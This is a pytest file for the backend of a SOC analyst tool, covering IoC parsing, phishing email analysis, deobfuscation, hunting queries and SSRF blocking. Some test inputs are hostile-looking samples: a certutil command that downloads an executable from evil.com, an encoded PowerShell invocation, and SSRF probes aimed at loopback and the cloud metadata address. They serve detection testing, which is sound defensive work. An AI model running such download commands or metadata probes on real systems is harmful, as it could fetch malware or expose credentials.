"""Tests for FastAPI backend API endpoints."""

import pytest
from fastapi.testclient import TestClient
from server import app

client = TestClient(app)


def test_status_endpoint():
    res = client.get("/api/status")
    assert res.status_code == 200
    data = res.json()
    assert "pools" in data
    assert "cache" in data
    assert "services" in data


def test_parse_endpoint():
    res = client.post("/api/parse", json={"raw_text": "Check IP 1[.]1[.]1[.]1 and hash 84c82835a5d21bbcf75a61706d8ab549"})
    assert res.status_code == 200
    data = res.json()
    assert data["total"] == 2
    types = [i["type"] for i in data["items"]]
    assert "ipv4" in types
    assert "md5" in types


def test_feed_summarize_rejects_unknown_article(monkeypatch):
    import server
    monkeypatch.setattr(server, "get_article_by_link", lambda link: None)
    res = client.post("/api/feed/summarize", json={"link": "https://example.test/not-in-feed"})
    assert res.status_code == 404


def test_watchlist_upload_preview_does_not_save(monkeypatch, tmp_path):
    import core.watchlist_import as wi
    target = tmp_path / "watchlist.json"
    monkeypatch.setattr(wi, "WATCHLIST_FILE", target)
    res = client.post("/api/watchlist/upload", files={"file": ("list.csv", b"owner,product\nInternal,FortiGate\n")}, data={"apply": "false"})
    assert res.status_code == 200
    assert res.json()["report"]["assets"] == 1
    assert not target.exists()

    res = client.post("/api/watchlist/upload", files={"file": ("list.csv", b"owner,product\nInternal,FortiGate\n")}, data={"apply": "true"})
    assert res.json()["applied"] is True
    assert target.exists()


def test_watchlist_upload_rejects_bad_file():
    res = client.post("/api/watchlist/upload", files={"file": ("list.txt", b"x")}, data={"apply": "false"})
    assert res.status_code == 400


def test_watchlist_template_download():
    res = client.get("/api/watchlist/template")
    assert res.status_code == 200
    assert res.content[:2] == b"PK"  # xlsx is a zip


def test_digest_pdf_unknown_id():
    assert client.get("/api/digest/999999/pdf").status_code == 404


def test_ai_providers_endpoint():
    data = client.get("/api/ai/providers").json()
    assert set(data["providers"]) == {"claude", "local"}


def test_watchlist_cve_rejects_bad_id():
    res = client.get("/api/watchlist/cve/not-a-cve")
    assert res.status_code == 400


def test_index_html_served():
    res = client.get("/")
    assert res.status_code == 200
    assert "LazySOC" in res.text
    assert "IoC Triage" in res.text
    assert "Network Recon" in res.text
    assert "Phishing EML" in res.text
    assert "Threat Intel Auto-Detection Pipeline" in res.text
    assert "SIEM Hunting Queries" in res.text
    assert "SOC Incident Note" in res.text
    assert "OpenSearch" in res.text


def test_scan_with_selected_providers():
    res = client.post("/api/scan", json={
        "raw_text": "1.1.1.1",
        "providers": ["dns", "urlhaus"],
        "use_cache": False
    })
    assert res.status_code == 200
    data = res.json()
    assert "results" in data
    assert len(data["results"]) == 1
    assert data["results"][0]["ioc"] == "1.1.1.1"



def test_mail_health_endpoint(monkeypatch):
    from server import mail_checker
    monkeypatch.setattr(mail_checker, "check_domain", lambda d: {
        "domain": d, "score": 90, "rating": "PROTECTED", "dmarc": {"has_dmarc": True}
    })
    res = client.get("/api/mail-health?domain=google.com")
    assert res.status_code == 200
    data = res.json()
    assert "score" in data
    assert "rating" in data
    assert "dmarc" in data


def test_recon_endpoint(monkeypatch):
    import server
    monkeypatch.setattr(server, "perform_recon", lambda t: {
        "target": t, "type": "ip", "ptr": "dns.google"
    })
    res = client.get("/api/recon?target=8.8.8.8")
    assert res.status_code == 200
    data = res.json()
    assert data["target"] == "8.8.8.8"
    assert data["type"] == "ip"
    assert "ptr" in data


def test_analyze_eml_endpoint():
    sample_raw = "From: PayPal Support <phish@scam.org>\nReply-To: bad@evil.com\nSubject: Account Locked\nAuthentication-Results: spf=fail; dmarc=fail\n\nClick http://1.2.3.4/login"
    res = client.post("/api/analyze-eml", data={"raw_text": sample_raw})
    assert res.status_code == 200
    data = res.json()
    assert data["risk_verdict"] == "PHISHING / MALICIOUS"
    assert data["risk_score"] >= 60
    assert len(data["alerts"]) > 0


def test_key_endpoints_locked_by_default():
    # Attempting to add key via API should be blocked (403)
    res_add = client.post("/api/keys", json={"service": "virustotal", "key": "malicious_attempt"})
    assert res_add.status_code == 403

    # Attempting to delete key via API should be blocked (403)
    res_del = client.delete("/api/keys?service=virustotal&key=somekey")
    assert res_del.status_code == 403


def test_status_endpoint_never_leaks_raw_keys():
    res = client.get("/api/status")
    assert res.status_code == 200
    data = res.json()
    for service, key_list in data.get("services", {}).items():
        for k in key_list:
            assert "key_raw" not in k, f"Raw API key was leaked in status for service {service}!"
            assert "key_masked" in k


def test_index_html_hides_key_management():
    res = client.get("/")
    assert res.status_code == 200
    assert 'id="tab-btn-keys"' not in res.text
    assert 'id="view-keys"' not in res.text
    assert "removeKey(" not in res.text
    # Verify theme picker, feed tab, cve tab & footer watermark exist
    assert 'id="theme-btn"' in res.text
    assert 'id="tab-btn-feed"' in res.text
    assert 'id="tab-btn-cve"' in res.text
    assert 'id="view-cve"' in res.text
    assert '@p3nr0s3' in res.text


def test_cyber_feed_endpoint():
    res = client.get("/api/feed?source=all&limit=5")
    assert res.status_code == 200
    data = res.json()
    assert "total" in data
    assert "sources" in data
    assert "items" in data
    assert isinstance(data["items"], list)


def test_cve_endpoint():
    res = client.get("/api/cve")
    assert res.status_code == 200
    data = res.json()
    assert "items" in data
    assert len(data["items"]) > 0
    first = data["items"][0]
    assert "id" in first
    assert "cvss" in first
    assert "severity" in first


def test_cve_vendor_search_and_pagination():
    res = client.get("/api/cve?query=Fortinet&limit=5&page=1")
    assert res.status_code == 200
    data = res.json()
    assert "items" in data
    assert len(data["items"]) > 0
    # Verify latest items are returned and sorted descending
    dates = [item.get("published", "") for item in data["items"] if item.get("published")]
    if len(dates) >= 2:
        assert dates == sorted(dates, reverse=True)

    # Test page 2
    res2 = client.get("/api/cve?query=Fortinet&limit=5&page=2")
    assert res2.status_code == 200
    data2 = res2.json()
    assert "items" in data2
    assert "has_more" in data2


def test_playbooks_endpoints():
    res = client.get("/api/playbooks")
    assert res.status_code == 200
    data = res.json()
    assert "playbooks" in data
    assert len(data["playbooks"]) >= 4

    # Check specific playbook
    res_pb = client.get("/api/playbooks/phishing")
    assert res_pb.status_code == 200
    pb = res_pb.json()
    assert pb["id"] == "phishing"
    assert "tasks" in pb
    assert len(pb["tasks"]) > 0

    # Test report generation
    res_rep = client.post("/api/playbooks/report", json={
        "playbook_id": "phishing",
        "completed_task_ids": ["phish_1", "phish_2"],
        "analyst_name": "Test Analyst",
        "incident_id": "INC-TEST-999",
        "iocs": ["185.220.101.5", "attacker-c2.online"]
    })
    assert res_rep.status_code == 200
    rep = res_rep.json()
    assert "report_markdown" in rep
    assert "INC-TEST-999" in rep["report_markdown"]
    assert "185.220.101.5" in rep["report_markdown"]
    assert rep["completed_count"] == 2


def test_trace_url_endpoint(monkeypatch):
    import server
    monkeypatch.setattr(server, "trace_url_redirects", lambda u, max_hops=8: {
        "initial_url": u, "final_url": u, "hops": [{"hop": 1, "url": u, "status_code": 200}],
        "total_hops": 1, "is_shortener": False, "has_redirects": False
    })
    res = client.post("/api/trace-url", json={"url": "https://example.com"})
    assert res.status_code == 200
    data = res.json()
    assert "final_url" in data
    assert "hops" in data
    assert isinstance(data["hops"], list)
    assert len(data["hops"]) > 0


def test_deobfuscator_endpoint():
    # Test PowerShell Encoded Command (Write-Host "LazySOC") in UTF-16LE base64
    import base64
    ps_cmd = 'Write-Host "LazySOC"'
    b64_enc = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
    payload = f"powershell.exe -NoP -enc {b64_enc}"

    res = client.post("/api/deobfuscate", json={"payload": payload})
    assert res.status_code == 200
    data = res.json()
    assert "powershell" in data
    assert len(data["powershell"]) > 0
    assert "Write-Host" in data["powershell"][0]["decoded_command"]

    # Test Hex and ROT13
    hex_payload = "48656c6c6f"  # "Hello"
    res2 = client.post("/api/deobfuscate", json={"payload": hex_payload})
    assert res2.status_code == 200
    data2 = res2.json()
    assert data2.get("hex_decoded") == "Hello"
    assert data2.get("rot13") == "48656p6p6s"


def test_hunt_single_ioc_endpoint():
    res = client.post("/api/hunt", json={
        "ioc": "185.220.101.5",
        "type": "ipv4",
        "verdict": "Malicious"
    })
    assert res.status_code == 200
    data = res.json()
    assert "queries" in data
    assert "splunk" in data["queries"]
    assert "sentinel" in data["queries"]
    assert "crowdstrike" in data["queries"]
    assert "185.220.101.5" in data["queries"]["splunk"]


def test_mitre_endpoints():
    # 1. Get matrix structure
    res = client.get("/api/mitre")
    assert res.status_code == 200
    data = res.json()
    assert "tactics" in data
    assert "matrix" in data
    assert data["techniques_count"] > 0

    # 2. Analyze coverage
    res2 = client.post("/api/mitre/coverage", json={
        "iocs": [{"ioc": "evil.com", "type": "domain", "verdict": "Malicious"}],
        "playbook_id": "phishing"
    })
    assert res2.status_code == 200
    data2 = res2.json()
    assert "active_techniques" in data2
    assert "T1566" in data2["active_techniques"]  # Phishing


def test_sanitize_endpoint():
    # Defang
    res = client.post("/api/sanitize", json={
        "text": "Visit http://evil.com or connect to 1.1.1.1",
        "mode": "defang"
    })
    assert res.status_code == 200
    data = res.json()
    assert "hxxp://evil[.]com" in data["result"]
    assert "1[.]1[.]1[.]1" in data["result"]

    # Refang
    res2 = client.post("/api/sanitize", json={
        "text": "hxxps://evil[.]com/payload and 8[.]8[.]8[.]8",
        "mode": "refang"
    })
    assert res2.status_code == 200
    data2 = res2.json()
    assert "https://evil.com/payload" in data2["result"]
    assert "8.8.8.8" in data2["result"]


def test_trace_url_ssrf_protection():
    # 1. Localhost / loopback check
    res_loopback = client.post("/api/trace-url", json={"url": "http://127.0.0.1:8000/api/status"})
    assert res_loopback.status_code == 200
    data_lb = res_loopback.json()
    assert data_lb.get("blocked_ssrf") is True
    assert "SSRF" in data_lb.get("error", "")

    # 2. Cloud metadata IP check
    res_meta = client.post("/api/trace-url", json={"url": "http://169.254.169.254/latest/meta-data/"})
    assert res_meta.status_code == 200
    data_meta = res_meta.json()
    assert data_meta.get("blocked_ssrf") is True


def test_recon_includes_shodan_exposure(monkeypatch):
    import server
    monkeypatch.setattr(server, "perform_recon", lambda t: {
        "target": t, "type": "ip", "shodan": {"ports": [80, 443], "vulns": []}
    })
    res = client.get("/api/recon?target=1.1.1.1")
    assert res.status_code == 200
    data = res.json()
    assert "shodan" in data
    assert isinstance(data["shodan"], dict)


def test_scan_stream_endpoint():
    res = client.post("/api/scan/stream", json={"raw_text": "1.1.1.1", "providers": ["urlhaus"], "use_cache": False})
    assert res.status_code == 200
    assert "text/event-stream" in res.headers.get("content-type", "")
    assert "data:" in res.text



def test_scan_airgapped_mode():
    res = client.post("/api/scan", json={"raw_text": "185.220.101.5", "airgapped_mode": True, "use_cache": False})
    assert res.status_code == 200
    data = res.json()
    assert len(data["results"]) == 1
    assert "Air-Gapped" in data["results"][0]["notes"]
    assert data["results"][0]["vt_stats"] == "Suppressed"


def test_soc_l1_api_endpoints():
    # 1. Event Lookup
    res_ev = client.post("/api/soc/event-lookup", json={"query": "0xC000006D"})
    assert res_ev.status_code == 200
    assert len(res_ev.json()["matched_ntstatus"]) > 0

    # 2. LOLBAS
    res_lol = client.post("/api/soc/lolbas", json={"command": "certutil -urlcache -split -f http://evil.com/a.exe a.exe"})
    assert res_lol.status_code == 200
    assert res_lol.json()["is_lolbas"] is True

    # 3. Impossible Travel
    res_tr = client.post("/api/soc/impossible-travel", json={
        "lat1": -6.2088, "lon1": 106.8456, "time1": "2026-10-13T08:00:00Z",
        "lat2": 50.1109, "lon2": 8.6821, "time2": "2026-10-13T08:30:00Z"
    })
    assert res_tr.status_code == 200
    assert res_tr.json()["is_impossible"] is True

    # 4. FP Checker
    res_fp = client.post("/api/soc/fp-check", json={"indicator": "update.microsoft.com"})
    assert res_fp.status_code == 200
    assert res_fp.json()["is_likely_false_positive"] is True

    # 5. IP Classifier
    res_ip = client.post("/api/soc/ip-classify", json={"ip": "1.1.1.1", "asn": "AS13335 Cloudflare"})
    assert res_ip.status_code == 200
    assert "classification" in res_ip.json()

    # 6. User-Agent Dissector
    res_ua = client.post("/api/soc/user-agent", json={"user_agent": "sqlmap/1.5"})
    assert res_ua.status_code == 200
    assert res_ua.json()["threat_level"] == "CRITICAL"







